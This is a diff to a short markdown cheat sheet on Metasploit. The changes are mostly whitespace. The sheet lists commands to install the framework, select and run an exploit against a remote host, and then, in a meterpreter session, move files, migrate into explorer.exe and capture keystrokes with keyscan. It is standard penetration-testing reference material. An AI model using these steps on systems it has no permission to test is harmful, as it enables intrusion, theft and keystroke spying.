@@ -8,10 +8,10 @@ The Metasploit Project is a computer security project that provides information 
     sudo apt install metasploit-framework	
     
 ### search heartbleed
-	  grep exploit search samba/heartbleed	
+    grep exploit search samba/heartbleed	
     
 ### 13 is paylod num from grep search
-	  use 13	
+    use 13	
 		
 ### Set rhost	
     set rhost ip	
@@ -21,42 +21,38 @@ The Metasploit Project is a computer security project that provides information 
 		
 ### show payload list	
     show option	
-	  exploit/run	
+    exploit/run	
 		
 ## After opening a session		
 		
 ### Inner command	
     meterpreter>  background	
 		
-	  meterpreter> session -l	
+    meterpreter> session -l	
     
 ### Session number
-	  meterpreter>  session -i s_num	
+    meterpreter>  session -i s_num	
 		
-	  eog file.jpg	
+    eog file.jpg	
+
+    meterpreter> migrate id(explore.exe)	
 		
-  	meterpreter> migrate id(explore.exe)	
+    meterpreter> upload file_name	
 		
-	  meterpreter> upload file_name	
+    meterpreter> download file_name	
 		
-  	meterpreter> download file_name	
-		
-	  meterpreter> execute -f file_name	
-		
-  	meterpreter> keyscan_start	
-		
-  	meterpreter> keyscan_dump	
+    meterpreter> execute -f file_name	
+
+    meterpreter> keyscan_start	
+
+    meterpreter> keyscan_dump	
     
 ### if need to stop 
-  	meterpreter> keyscan_stop	
+    meterpreter> keyscan_stop	
+    
+    meterpreter> 	
 		
-	  meterpreter> 	
-		
-  	meterpreter> 	
-		
-  	meterpreter> 	
-		
-  	meterpreter> 	
+
     
     
 		
